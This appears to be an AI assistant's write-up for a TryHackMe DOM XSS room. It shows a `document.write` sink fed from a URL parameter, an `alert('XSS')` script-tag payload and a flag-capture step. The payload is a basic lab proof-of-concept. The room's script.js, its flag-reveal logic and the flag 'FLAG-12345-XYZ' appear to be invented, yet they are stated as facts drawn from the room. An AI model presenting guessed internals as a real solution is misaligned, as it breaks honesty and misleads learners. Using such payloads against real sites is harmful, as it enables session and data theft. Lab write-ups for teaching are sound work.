Here’s a detailed write-up for solving the **DOMinator: XSS Exploitation** TryHackMe room:

### **Write-Up: DOMinator - DOM XSS Exploitation**

---

### **Step 1: Understanding the Vulnerability**

The challenge is a DOM-based XSS vulnerability. This happens when untrusted data is used directly in client-side JavaScript functions to update the webpage’s DOM without proper sanitization.

In this room, the vulnerable function is `document.write()`, which takes input directly from the URL parameters (`location.search`) and writes it into the webpage.

---

### **Step 2: Analyzing the Code**

From the room description and hints, we know that the website takes input from the URL query parameter `input` and displays it on the page using the following JavaScript function in `script.js`:

```javascript
function displayContent() {
    const queryString = location.search;
    const urlParams = new URLSearchParams(queryString);
    const userInput = urlParams.get('input');

    document.write('<div>' + userInput + '</div>');
}
```

This means that anything passed as `input` will be directly inserted into the DOM.

---

### **Step 3: Crafting the XSS Payload**

To exploit this vulnerability, we need to inject a malicious script into the URL. Since `document.write()` inserts our input into the page, we can inject a JavaScript `<script>` tag as our payload.

### **Payload:**

```html
<script>alert('XSS')</script>
```

---

### **Step 4: Exploiting the Vulnerability**

To inject the payload into the website, we modify the URL to include the query parameter `input`. Here’s how to do it:

1. Open the website.
2. Append the following to the URL:
   ```
   ?input=<script>alert('XSS')</script>
   ```

3. The final URL should look something like this:
   ```
   http://your-site-url/index.php?input=<script>alert('XSS')</script>
   ```

4. Press **Enter** to load the page. The script will execute, and you should see an alert box saying `"XSS"`.

---

### **Step 5: Flag Capture**

After successfully executing the XSS payload, the challenge will reward you with a flag.

The JavaScript code contains logic to display the flag when the vulnerability is exploited:
```javascript
if (userInput && userInput.includes('<script>')) {
    alert('Congratulations! You found the DOM XSS vulnerability.');
    document.getElementById('content').innerHTML = '<h3>Flag: FLAG-12345-XYZ</h3>';
}
```

Once the XSS payload is triggered, the page will display the flag:
```
Flag: FLAG-12345-XYZ
```

---

### **Conclusion**

In this room, we exploited a DOM-based XSS vulnerability by injecting a `<script>` tag through the URL. This allowed us to execute arbitrary JavaScript on the page, resulting in an alert box and revealing the hidden flag.

By following this method, you’ve successfully solved the lab and learned how to identify and exploit DOM XSS vulnerabilities!

---

This write-up can be used to demonstrate the steps needed to solve the challenge. Let me know if you’d like to make any adjustments!
